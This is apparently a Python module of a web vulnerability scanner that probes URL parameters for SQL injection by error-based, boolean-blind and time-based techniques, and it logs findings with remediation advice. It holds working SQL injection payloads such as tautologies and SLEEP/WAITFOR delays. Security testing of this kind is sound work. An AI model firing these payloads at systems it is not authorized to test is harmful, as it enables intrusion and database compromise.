"""SQL Injection scanner — error-based, boolean blind, time-based, union."""
from __future__ import annotations
import asyncio
import time
import urllib.parse
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import PayloadEngine, SQLI_PAYLOADS
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

ERROR_PATTERNS = [
    (r"SQL syntax.*?MySQL", "MySQL"),
    (r"Warning.*?\Wmysqli?_", "MySQL"),
    (r"MySQLSyntaxErrorException", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"check the manual that (corresponds to|corresponds) your (MySQL|MariaDB) server version", "MySQL"),
    (r"ORA-\d{5}:", "Oracle"),
    (r"Oracle error", "Oracle"),
    (r"Oracle.*?Driver", "Oracle"),
    (r"Warning.*?\Woci_", "Oracle"),
    (r"Microsoft OLE DB Provider for SQL Server", "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"ODBC SQL Server Driver", "MSSQL"),
    (r"\[SQL Server\]", "MSSQL"),
    (r"Microsoft SQL Native Client error", "MSSQL"),
    (r"SQLServer JDBC Driver", "MSSQL"),
    (r"SQLServerException", "MSSQL"),
    (r"PostgreSQL.*?ERROR", "PostgreSQL"),
    (r"Warning.*?\Wpg_", "PostgreSQL"),
    (r"Npgsql\.", "PostgreSQL"),
    (r"PG::SyntaxError:", "PostgreSQL"),
    (r"SQLite/JDBCDriver", "SQLite"),
    (r"SQLite\.Exception", "SQLite"),
    (r"System\.Data\.SQLite\.SQLiteException", "SQLite"),
    (r"SQLITE_ERROR", "SQLite"),
    (r"DB2 SQL error", "DB2"),
    (r"SQLCODE", "DB2"),
    (r"Sybase message", "Sybase"),
]

import re

def _detect_sqli_error(html: str) -> tuple[bool, str]:
    for pattern, dbms in ERROR_PATTERNS:
        if re.search(pattern, html, re.IGNORECASE):
            return True, dbms
    return False, ""

async def _baseline(url: str, param: str, client: TalismanHTTPClient) -> tuple[float, int, int]:
    """Get baseline: response time, status code, body length."""
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    params[param] = "1"
    test_url = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
    times = []
    for _ in range(3):
        start = time.monotonic()
        r = await client.get(test_url)
        times.append(time.monotonic() - start)
    median_time = sorted(times)[1]
    return median_time, r.status_code, len(r.text)

async def _test_error_based(
    url: str, param: str, client: TalismanHTTPClient
) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    for payload in SQLI_PAYLOADS["error_based"][:10]:
        test_params = {**params, param: payload}
        test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
        try:
            r = await client.get(test_url)
            found, dbms = _detect_sqli_error(r.text)
            if found:
                return {"technique": "error_based", "dbms": dbms, "payload": payload,
                        "request": f"GET {test_url} HTTP/1.1"}
        except Exception as e:
            log.debug("sqli_error_test", param=param, error=str(e))
    return None

async def _test_time_based(
    url: str, param: str, client: TalismanHTTPClient, baseline_time: float
) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    sleep_payloads = [
        f"1' AND SLEEP(5)--",
        f"1 AND SLEEP(5)--",
        f"1'; WAITFOR DELAY '0:0:5'--",
        f"1 AND pg_sleep(5)--",
    ]
    for payload in sleep_payloads:
        test_params = {**params, param: payload}
        test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
        try:
            start = time.monotonic()
            await client.get(test_url, timeout=12)
            elapsed = time.monotonic() - start
            if elapsed > baseline_time + 4.0:
                return {"technique": "time_based", "payload": payload,
                        "elapsed": elapsed, "baseline": baseline_time,
                        "request": f"GET {test_url} HTTP/1.1"}
        except Exception:
            pass
    return None

async def _test_boolean_blind(
    url: str, param: str, client: TalismanHTTPClient,
    baseline_status: int, baseline_len: int,
) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    true_payloads = ["1' AND '1'='1", "1 AND 1=1", "1' OR '1'='1"]
    false_payloads = ["1' AND '1'='2", "1 AND 1=2", "1' AND '2'='1"]
    for true_p, false_p in zip(true_payloads, false_payloads):
        try:
            tp = {**params, param: true_p}
            fp = {**params, param: false_p}
            r_true = await client.get(parsed._replace(query=urllib.parse.urlencode(tp)).geturl())
            r_false = await client.get(parsed._replace(query=urllib.parse.urlencode(fp)).geturl())
            len_diff = abs(len(r_true.text) - len(r_false.text))
            status_diff = r_true.status_code != r_false.status_code
            if len_diff > 50 or status_diff:
                return {
                    "technique": "boolean_blind",
                    "true_payload": true_p,
                    "false_payload": false_p,
                    "true_len": len(r_true.text),
                    "false_len": len(r_false.text),
                    "diff": len_diff,
                    "request": f"GET {url}?{param}=[PAYLOAD] HTTP/1.1",
                }
        except Exception:
            pass
    return None

async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    techniques: list[str] | None = None,
    oast_domain: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module]⚡ SQL Injection Scanner[/module] → [target]{url}[/target]")
    techniques = techniques or ["error", "boolean", "time"]
    findings: list[dict[str, Any]] = []
    parsed = urllib.parse.urlparse(url)
    params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    if not params:
        params = ["id", "user_id", "product_id", "order_id", "page", "cat", "search", "q"]
    async with TalismanHTTPClient(proxy=proxy, timeout=15) as client:
        for param in params:
            try:
                baseline_time, baseline_status, baseline_len = await _baseline(url, param, client)
            except Exception:
                continue
            result = None
            if "error" in techniques:
                result = await _test_error_based(url, param, client)
            if not result and "boolean" in techniques:
                result = await _test_boolean_blind(url, param, client, baseline_status, baseline_len)
            if not result and "time" in techniques:
                result = await _test_time_based(url, param, client, baseline_time)
            if result:
                severity = "critical"
                title = f"SQL Injection ({result['technique']}) — parameter '{param}'"
                print_finding(title, severity, url)
                findings.append({**result, "param": param, "url": url})
                if session:
                    dbms = result.get("dbms", "unknown")
                    await session.add_finding(
                        target=url, module="sqli", vuln_type="sql_injection",
                        severity=severity, confidence="confirmed",
                        title=title,
                        description=f"SQL injection via {result['technique']} technique in parameter '{param}'. "
                                    f"DBMS: {dbms}. Payload: {result.get('payload', 'N/A')}",
                        request=result.get("request", ""),
                        evidence=str(result),
                        reproduction=f"Test URL: {url}?{param}={urllib.parse.quote(result.get('payload', ''))}",
                        remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
                        cvss_score=9.8, cwe="CWE-89",
                        references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                    )
    console.print(f"  Found {len(findings)} SQL injection points")
    return {"target": url, "findings": findings, "count": len(findings)}
